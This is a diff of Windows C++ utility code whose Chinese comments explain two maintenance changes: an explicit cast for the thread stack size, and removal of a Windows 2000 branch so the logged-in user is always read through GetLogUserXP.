@@ -44,7 +44,8 @@ HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
     arg.arglist = (void *)lpParameter;
     arg.bInteractive = bInteractive;
     arg.hEventTransferArg = CreateEvent(NULL, FALSE, FALSE, NULL);
-    hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
+    //dwStackSize 是调用方传入的线程栈大小，实际取值远小于 unsigned int 的上限，这里显式收窄以消除 C4244 告警。
+    hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, static_cast<unsigned>(dwStackSize), ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
     WaitForSingleObject(arg.hEventTransferArg, INFINITE);
     CloseHandle(arg.hEventTransferArg);
 
@@ -92,86 +93,13 @@ TCHAR *GetLogUserXP()
         return NULL;
 }
 
-TCHAR *GetLogUser2K()
-{
-    DWORD	dwProcessID = GetProcessID(TEXT("explorer.exe"));
-    if (dwProcessID == 0)
-        return NULL;
-
-    BOOL fResult = FALSE;
-    HANDLE hProc = NULL;
-    HANDLE hToken = NULL;
-    TOKEN_USER *pTokenUser = NULL;
-    TCHAR	*lpUserName = NULL;
-    __try
-    {
-        // Open the process with PROCESS_QUERY_INFORMATION access
-        hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
-        if (hProc == NULL)
-        {
-            __leave;
-        }
-        fResult = OpenProcessToken(hProc, TOKEN_QUERY, &hToken);
-        if (!fResult)
-        {
-            __leave;
-        }
-
-        DWORD dwNeedLen = 0;
-        fResult = GetTokenInformation(hToken, TokenUser, NULL, 0, &dwNeedLen);
-        if (dwNeedLen > 0)
-        {
-            pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
-            fResult = GetTokenInformation(hToken, TokenUser, pTokenUser, dwNeedLen, &dwNeedLen);
-            if (!fResult)
-            {
-                __leave;
-            }
-        }
-        else
-        {
-            __leave;
-        }
-
-        SID_NAME_USE sn;
-        TCHAR szDomainName[MAX_PATH];
-        DWORD dwDmLen = MAX_PATH;
-
-        DWORD	nNameLen = 256;
-        lpUserName = new TCHAR[256];
-
-        fResult = LookupAccountSid(NULL, pTokenUser->User.Sid, lpUserName, &nNameLen, szDomainName, &dwDmLen, &sn);
-    }
-    __finally
-    {
-        if (hProc)
-            ::CloseHandle(hProc);
-        if (hToken)
-            ::CloseHandle(hToken);
-        if (pTokenUser)
-            delete[](char*)pTokenUser;
-
-        return lpUserName;
-    }
-}
-
+//原先按系统版本在 Windows 2000（主版本 5、次版本 0）与后续系统之间分流：Windows 2000
+//走 GetLogUser2K，更新的系统走 GetLogUserXP。由于本程序的最低支持版本已经是 Windows 7，
+//Windows 2000 分支不再可达；同时 GetVersionEx 从 Windows 8.1 起被废弃、返回值不再可靠，
+//故移除版本判断，统一走 GetLogUserXP（原 GetLogUser2K 已无调用点，一并删除）。
 TCHAR *GetCurrentLoginUser()
 {
-    OSVERSIONINFOEX    OsVerInfo;
-    ZeroMemory(&OsVerInfo, sizeof(OSVERSIONINFOEX));
-    OsVerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-    if (!GetVersionEx((OSVERSIONINFO *)&OsVerInfo))
-    {
-        OsVerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
-        if (!GetVersionEx((OSVERSIONINFO *)&OsVerInfo))
-            return NULL;
-    }
-
-    if (OsVerInfo.dwMajorVersion == 5 && OsVerInfo.dwMinorVersion == 0)
-        return GetLogUser2K();
-    else
-        return GetLogUserXP();
-
+    return GetLogUserXP();
 }
 
 bool SwitchInputDesktop()
